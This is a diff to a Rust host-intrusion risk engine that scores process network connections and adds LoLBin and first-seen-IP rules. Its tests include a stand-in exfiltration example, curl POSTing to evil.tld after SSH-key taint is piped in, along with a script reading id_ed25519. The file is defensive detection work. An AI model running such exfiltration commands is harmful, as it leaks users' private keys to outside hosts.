@@ -1,8 +1,9 @@
 //! Transparent Deterministic Risk Engine.
 //!
 //! Evaluates network and execution events in < 1 ms without external dependencies
-//! or LLMs, applying deterministic rule weights clamped to 0..100.
+//! or LLMs, applying deterministic rule weights with LoLBin attack mitigation.
 
+use std::net::IpAddr;
 use tracing::debug;
 
 use sentinel_common::config::RulesConfig;
@@ -17,6 +18,7 @@ pub struct NetworkContext {
     pub dest_ip: Option<String>,
     pub dest_port: u16,
     pub has_dns_record: bool,
+    pub is_first_seen_ip: bool,
     pub current_time_ns: u64,
 }
 
@@ -35,7 +37,7 @@ impl RiskEngine {
 
     /// Evaluates the risk score of a process attempting a network connection.
     ///
-    /// Executes in < 1 ms and returns clamped 0..100 `RiskScore`.
+    /// Executes in < 1 ms and returns clamped 0..100 `RiskScore` with hierarchical rules.
     pub fn evaluate(&self, node: &ProcessNode, net: &NetworkContext) -> RiskScore {
         let mut firings = Vec::new();
 
@@ -45,22 +47,22 @@ impl RiskEngine {
             firings.push(RuleFiring {
                 rule_id: RuleId::FilelessMemfd,
                 weight,
-                reason: "Бесфайловое исполнение кода из памяти (memfd_create)".to_string(),
+                reason: "Бесфайловое исполнение кода из оперативной памяти (memfd_create)".to_string(),
             });
         }
 
-        // 2. [+40] SECRET_NON_OWNER
+        // 2. [+40] SECRET_NON_OWNER / TAINTED
         let has_secret = !node.secret_accesses.is_empty();
         if has_secret {
             let weight = self.get_weight(RuleId::SecretNonOwner.as_str(), 40);
             firings.push(RuleFiring {
                 rule_id: RuleId::SecretNonOwner,
                 weight,
-                reason: "Чтение защищенного секрета процессом вне App Scope".to_string(),
+                reason: "Чтение защищенного секрета или наследование taint через pipe/FIFO/файл вне App Scope".to_string(),
             });
         }
 
-        // 3. [+15] FAST_EXFIL_BURST (<= 5 seconds after secret read)
+        // 3. [+15] FAST_EXFIL_BURST (<= 5 seconds after secret access)
         if let Some(last_secret) = node.secret_accesses.last() {
             let delta_ns = net.current_time_ns.saturating_sub(last_secret.timestamp_ns);
             let delta_secs = delta_ns as f64 / 1_000_000_000.0;
@@ -85,14 +87,15 @@ impl RiskEngine {
             || path_str.contains("/Downloads/")
             || path_str.starts_with("/var/tmp");
 
-        let pkg_owned = self.dpkg_checker.check_package(&node.exe_path).is_some();
+        let dpkg_info = self.dpkg_checker.check_package(&node.exe_path);
+        let is_verified_package = dpkg_info.as_ref().map(|info| info.is_integrity_verified).unwrap_or(false);
 
-        if is_untrusted_dir || (!pkg_owned && !node.is_interpreter()) {
+        if is_untrusted_dir || (!is_verified_package && !node.is_interpreter()) {
             let weight = self.get_weight(RuleId::UntrustedBinaryOrigin.as_str(), 25);
             firings.push(RuleFiring {
                 rule_id: RuleId::UntrustedBinaryOrigin,
                 weight,
-                reason: format!("Исполняемый файл/скрипт запущен из ненадежного пути: {}", path_str),
+                reason: format!("Исполняемый файл/скрипт запущен из ненадежного пути или не верифицирован в dpkg: {}", path_str),
             });
         }
 
@@ -108,7 +111,19 @@ impl RiskEngine {
             }
         }
 
-        // 6. [+10] RAW_IP_CONNECT
+        // 6. [+15] FIRST_SEEN_DESTINATION (Public IP destination outside RFC1918 / loopback seen first time)
+        if let Some(ref ip) = net.dest_ip {
+            if !is_private_or_loopback_ip(ip) && net.is_first_seen_ip {
+                let weight = self.get_weight(RuleId::FirstSeenDestination.as_str(), 15);
+                firings.push(RuleFiring {
+                    rule_id: RuleId::FirstSeenDestination,
+                    weight,
+                    reason: format!("Первое в истории процесса подключение к внешнему публичному IP: {}", ip),
+                });
+            }
+        }
+
+        // 7. [+10] RAW_IP_CONNECT (Direct IP connection without DNS query)
         let is_direct_ip = net.dest_ip.as_ref().map(|ip| is_numeric_ip(ip)).unwrap_or(false);
         if is_direct_ip && !net.has_dns_record {
             let weight = self.get_weight(RuleId::RawIpConnect.as_str(), 10);
@@ -119,15 +134,16 @@ impl RiskEngine {
             });
         }
 
-        // 7. [-35] TRUSTED_PACKAGE_CONTEXT
-        // Legitimate binary in dpkg context, and NOT an interpreter executing an untrusted script
+        // 8. [-35] TRUSTED_PACKAGE_CONTEXT
+        // Legitimate binary in dpkg context, and NOT an interpreter executing an untrusted script,
+        // AND ONLY if NO SECRET / TAINT IS PRESENT (LoLBin prevention)!
         let is_script_untrusted = node.script_path.is_some() || node.is_memfd;
-        if pkg_owned && !is_untrusted_dir && !is_script_untrusted {
+        if is_verified_package && !is_untrusted_dir && !is_script_untrusted && !has_secret {
             let weight = self.get_weight(RuleId::TrustedPackageContext.as_str(), -35);
             firings.push(RuleFiring {
                 rule_id: RuleId::TrustedPackageContext,
                 weight,
-                reason: "Бинарник верифицирован в пакетах системы (dpkg) и запущен в штатном контексте".to_string(),
+                reason: "Бинарник верифицирован в пакетах системы (dpkg) с проверкой хеша и запущен в штатном контексте".to_string(),
             });
         }
 
@@ -145,8 +161,24 @@ impl RiskEngine {
     }
 }
 
-fn is_numeric_ip(s: &str) -> bool {
-    s.parse::<std::net::IpAddr>().is_ok()
+pub fn is_numeric_ip(s: &str) -> bool {
+    s.parse::<IpAddr>().is_ok()
+}
+
+pub fn is_private_or_loopback_ip(ip_str: &str) -> bool {
+    if let Ok(ip) = ip_str.parse::<IpAddr>() {
+        match ip {
+            IpAddr::V4(ipv4) => {
+                ipv4.is_loopback()
+                    || ipv4.is_private()
+                    || ipv4.is_link_local()
+                    || ipv4.is_broadcast()
+            }
+            IpAddr::V6(ipv6) => ipv6.is_loopback(),
+        }
+    } else {
+        false
+    }
 }
 
 #[cfg(test)]
@@ -165,51 +197,67 @@ mod tests {
         node.script_path = Some(PathBuf::from("/tmp/install.py"));
         node.cmdline = vec!["python3".into(), "/tmp/install.py".into()];
 
-        // Accessed SSH key 100ms ago
+        // Accessed SSH key 140ms ago
         node.record_secret_access(
             PathBuf::from("/home/user/.ssh/id_ed25519"),
             SecretCategory::SshKey,
-            1_000_000_000, // 1s
+            1_000_000_000,
         );
 
         let net = NetworkContext {
             dest_ip: Some("185.220.101.5".into()),
             dest_port: 443,
             has_dns_record: false,
-            current_time_ns: 1_140_000_000, // 1.14s (0.14s delta)
+            is_first_seen_ip: true,
+            current_time_ns: 1_140_000_000,
         };
 
         let score = engine.evaluate(&node, &net);
 
         // Expected firings:
         // SECRET_NON_OWNER (+40)
-        // UNTRUSTED_BINARY_ORIGIN (+25, /tmp/install.py)
-        // FAST_EXFIL_BURST (+15, 0.14s delta <= 5s)
+        // FAST_EXFIL_BURST (+15)
+        // UNTRUSTED_BINARY_ORIGIN (+25)
+        // FIRST_SEEN_DESTINATION (+15)
         // RAW_IP_CONNECT (+10)
-        // Total = 90 (HIGH)
-        assert_eq!(score.total, 90);
+        // Total = 105 -> clamped to 100 (HIGH)
+        assert_eq!(score.total, 100);
         let thresholds = sentinel_common::risk::RiskThresholds::default();
         assert_eq!(score.classify(&thresholds), sentinel_common::risk::Verdict::High);
     }
 
     #[test]
-    fn test_fileless_memfd_detection() {
+    fn test_lolbin_curl_exfiltration_retains_grey_verdict() {
         let rules = RulesConfig::default();
         let dpkg = DpkgChecker::new();
         let engine = RiskEngine::new(rules, dpkg);
 
-        let mut node = ProcessNode::new(2000, 1, 1000, PathBuf::from("/memfd:stealer"));
-        node.is_memfd = true;
+        // System curl binary (in /usr/bin/curl)
+        let mut node = ProcessNode::new(2500, 1000, 1000, PathBuf::from("/usr/bin/curl"));
+        node.cmdline = vec!["curl".into(), "-X".into(), "POST".into(), "https://evil.tld".into()];
+
+        // Inherited taint through cat secret | curl pipe
+        node.record_secret_access(
+            PathBuf::from("/home/user/.ssh/id_rsa"),
+            SecretCategory::SshKey,
+            1_000_000_000,
+        );
 
         let net = NetworkContext {
-            dest_ip: Some("192.168.1.50".into()),
-            dest_port: 8080,
+            dest_ip: Some("93.184.216.34".into()),
+            dest_port: 443,
             has_dns_record: true,
-            current_time_ns: 10_000_000_000,
+            is_first_seen_ip: false,
+            current_time_ns: 20_000_000_000, // 19s delta (> 5s)
         };
 
         let score = engine.evaluate(&node, &net);
-        // FILELESS_MEMFD (+50)
-        assert!(score.total >= 50);
+
+        // SECRET_NON_OWNER (+40)
+        // TRUSTED_PACKAGE_CONTEXT (-35) MUST NOT FIRE!
+        // Final score must be at least 40 (GREY)
+        assert!(score.total >= 40);
+        assert!(!score.firings.iter().any(|f| f.rule_id == RuleId::TrustedPackageContext));
+        assert_eq!(score.classify(&sentinel_common::risk::RiskThresholds::default()), sentinel_common::risk::Verdict::Grey);
     }
 }
